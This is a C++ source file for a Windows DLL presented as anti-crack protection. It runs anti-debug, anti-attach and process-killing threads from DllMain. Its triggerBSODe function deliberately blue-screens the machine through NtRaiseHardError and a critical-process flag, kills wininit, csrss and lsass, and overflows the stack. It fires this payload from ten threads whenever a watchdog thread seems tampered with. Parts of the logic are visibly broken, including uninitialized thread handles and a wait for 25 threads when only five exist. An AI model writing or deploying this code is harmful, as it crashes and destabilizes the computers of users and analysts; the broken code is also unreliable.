#include "pch.h"
#include <Windows.h>
#include "AntiDebugger.hpp"
#include <iostream>
#include <thread>
#include "skStr.h"
#include <array>
#include <chrono>
#include <atomic>
#include "srungoat.h"
#include <iostream>
#include <thread>
#include <vector>
#include <string>
#include <string_view>
#include <random>
#include <sstream>
#include <d3d11.h>
#include <tchar.h>
#include <windowsx.h>
#include <wininet.h>
#include <map>
#pragma comment(lib, "wininet.lib")
#include <mutex>
#include <shlobj.h>
#include <fstream>
#include <filesystem>
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")
#include <wincrypt.h>
#pragma comment(lib, "Crypt32.lib")

#pragma comment(lib, "ntdll.lib")

// protect github :: https://github.com/ReFo0/anti-crack-system/tree/ReFo

#include "node_protect.h"
#include "integrity_check.h"
#include "anti_attach.h"
#include "anti_dump.h"
#include "kill_process.h"
#include "anti_debugger.h"
#include "selfcode.h"


typedef struct _MY_THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    CLIENT_ID ClientId;
    ULONG_PTR AffinityMask;
    LONG Priority;
    LONG BasePriority;
    ULONG SuspendCount;
} MY_THREAD_BASIC_INFORMATION, * PMY_THREAD_BASIC_INFORMATION;

static std::array<std::thread, 5> antiDebugThreads;
static std::atomic<bool> g_shouldExit(false);

struct ThreadMonitorInfo {
    std::atomic<bool> isAlive{ true };
    std::chrono::steady_clock::time_point lastCheck;
    std::atomic<bool> isInitialized{ false };
};

std::array<ThreadMonitorInfo, 5> threadStates;
std::atomic<int> g_initializedThreadCount(0);

void SecurityCheck() {
    while (true) {
        security::internal::debug_results result = security::check_security();
        
        if (result != security::internal::debug_results::none) {
            ExitProcess(0);
        }
        
        Sleep(100);
    }
}
typedef NTSTATUS(WINAPI* RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(WINAPI* NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
int timeout = 0;

static void recursiveFunction() {
    volatile char buffer[1024 * 1024];
    memset((void*)buffer, 0xFF, sizeof(buffer));
    recursiveFunction();
}

void triggerBSODe() {
    BOOLEAN bEnabled;
    ULONG uResp;
    HMODULE ntdll = LoadLibraryA(skCrypt("ntdll.dll").decrypt());
    if (ntdll) {
        RtlAdjustPrivilege pRtlAdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
        NtRaiseHardError pNtRaiseHardError = (NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");

        if (pRtlAdjustPrivilege && pNtRaiseHardError) {
            pRtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
            pNtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &uResp);
        }

        typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
        pRtlSetProcessIsCritical RtlSetProcessIsCritical = (pRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
        if (RtlSetProcessIsCritical) {
            BOOLEAN OldState = FALSE;
            RtlSetProcessIsCritical(TRUE, &OldState, FALSE);
            ExitProcess(0);
        }

        typedef void(__stdcall* KeBugCheckEx)(ULONG, ULONG, ULONG, ULONG, ULONG);
        KeBugCheckEx pKeBugCheckEx = (KeBugCheckEx)GetProcAddress(ntdll, "KeBugCheckEx");
        if (pKeBugCheckEx) {
            pKeBugCheckEx(0xDEADDEAD, 0xDEADBEEF, 0xDEADC0DE, 0xB16B00B5, 0xDEADFACE);
        }
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                if (!_wcsicmp(pe.szExeFile, skCrypt(L"wininit.exe").decrypt()) ||
                    !_wcsicmp(pe.szExeFile, skCrypt(L"csrss.exe").decrypt()) ||
                    !_wcsicmp(pe.szExeFile, skCrypt(L"lsass.exe").decrypt())) {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProcess) {
                        TerminateProcess(hProcess, 1);
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }

    recursiveFunction();

    PVOID BaseAddress = GetModuleHandle(NULL);
    if (BaseAddress) {
        DWORD OldProtect;
        if (VirtualProtect(BaseAddress, 4096, PAGE_EXECUTE_READWRITE, &OldProtect)) {
            memset(BaseAddress, 0, 4096);
            VirtualProtect(BaseAddress, 4096, OldProtect, &OldProtect);
        }
    }
}

void monitorAndProtect(int threadId) {
    const auto checkInterval = std::chrono::milliseconds(50 + (threadId * 13));
    const auto antiDebugInterval = std::chrono::milliseconds(100 + (threadId * 17));
    auto lastAntiDebug = std::chrono::steady_clock::now();

    HANDLE currentThread = GetCurrentThread();
    DWORD originalPriority = GetThreadPriority(currentThread);
    SetThreadPriority(currentThread, THREAD_PRIORITY_TIME_CRITICAL);

    threadStates[threadId].isInitialized = true;
    threadStates[threadId].lastCheck = std::chrono::steady_clock::now();
    g_initializedThreadCount++;

    while (g_initializedThreadCount < 25) {
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(100));

    HANDLE threadHandles[5];
    DWORD threadIds[5];

    for (int i = 0; i < 2; i++) {
        if (i != threadId) {
            threadIds[i] = GetThreadId(antiDebugThreads[i].native_handle());
            threadHandles[i] = OpenThread(THREAD_QUERY_INFORMATION | SYNCHRONIZE, FALSE, threadIds[i]);
        }
    }

    while (!g_shouldExit) {
        threadStates[threadId].isAlive = true;
        threadStates[threadId].lastCheck = std::chrono::steady_clock::now();

        auto now = std::chrono::steady_clock::now();
        if (now - lastAntiDebug > antiDebugInterval) {
            SecurityCheck();
            lastAntiDebug = now;
        }

        for (int i = 0; i < 5; i++) {
            if (i == threadId) continue;

            if (!threadStates[i].isInitialized) continue;

            DWORD exitCode;
            bool threadDead = false;

            if (threadHandles[i] != NULL) {
                if (WaitForSingleObject(threadHandles[i], 0) == WAIT_OBJECT_0 ||
                    !GetExitCodeThread(threadHandles[i], &exitCode) ||
                    exitCode != STILL_ACTIVE) {
                    threadDead = true;
                }
            }

            auto timeSinceLastCheck = std::chrono::steady_clock::now() - threadStates[i].lastCheck;
            if (!threadStates[i].isAlive || timeSinceLastCheck > std::chrono::milliseconds(500) || threadDead) {
                std::vector<std::thread> bsod_threads;
                for (int t = 0; t < 10; t++) {
                    bsod_threads.emplace_back([i, threadId]() {
                        triggerBSODe();
                        for (int m = 0; m < 25; m++) {
                            std::string msg = skCrypt("Don't try to crack my project").decrypt();
                            MessageBoxA(NULL, msg.c_str(), skCrypt("0x12_zqzd5js").decrypt(), MB_ICONERROR | MB_OK);
                        }
                    });
                }

                for (auto& thread : bsod_threads) {
                    thread.detach();
                }

                g_shouldExit = true;
                ExitProcess(0);
                return;
            }
        }

        std::this_thread::sleep_for(checkInterval);
    }

    for (int i = 0; i < 5; i++) {
        if (i != threadId && threadHandles[i] != NULL) {
            CloseHandle(threadHandles[i]);
        }
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        ZIGZAG_JUNK;  
        PYRAMID_JUNK;  
        ZIGZAG_JUNK;  
        START_ANTI_ATTACH;
        START_ANTI_DEBUG;
        START_ANTI_ATTACH;
        START_ANTI_PAUSE_THREAD;
        ZIGZAG_JUNK;  
        START_INTEGRITY_CHECK;
        std::thread(check_integrity).detach();
        std::thread(hidethread).detach();
        std::thread(selfcode).detach();
        std::thread(AntiAttach).detach();
        std::thread(remotepresent).detach();
        std::thread(contextthread).detach();
        std::thread(debugstring).detach();
        std::thread(kill_process).detach();
        ZIGZAG_JUNK;  
        std::thread(process_window).detach();
        std::thread(node_client).detach();
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SecurityCheck, NULL, 0, NULL);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)monitorAndProtect, NULL, 0, NULL);
    }
    return TRUE;
}